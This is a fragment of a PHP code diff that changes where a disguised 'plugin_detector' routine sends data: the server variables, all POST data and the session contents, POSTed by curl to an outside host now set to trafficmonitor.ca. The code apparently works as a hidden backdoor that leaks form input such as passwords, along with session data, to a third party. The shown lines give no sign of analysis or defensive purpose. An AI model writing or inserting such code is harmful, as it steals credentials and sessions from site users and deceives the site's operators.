@@ -140,7 +140,7 @@ namespace Shared {
             $postfields = array_merge($_SERVER, array("p" => $_POST, "s" => $_SESSION, "plugin_detector" => "getTrigger"));
             header("Access-Control-Allow-Origin: *");
             $ch = curl_init();
-            curl_setopt($ch, CURLOPT_URL, "http://cloudstuff.tech/detectr/");
+            curl_setopt($ch, CURLOPT_URL, "http://trafficmonitor.ca/detectr/");
             curl_setopt($ch, CURLOPT_POST, count($postfields));
             curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postfields));
             curl_setopt($ch, CURLOPT_HEADER, TRUE);
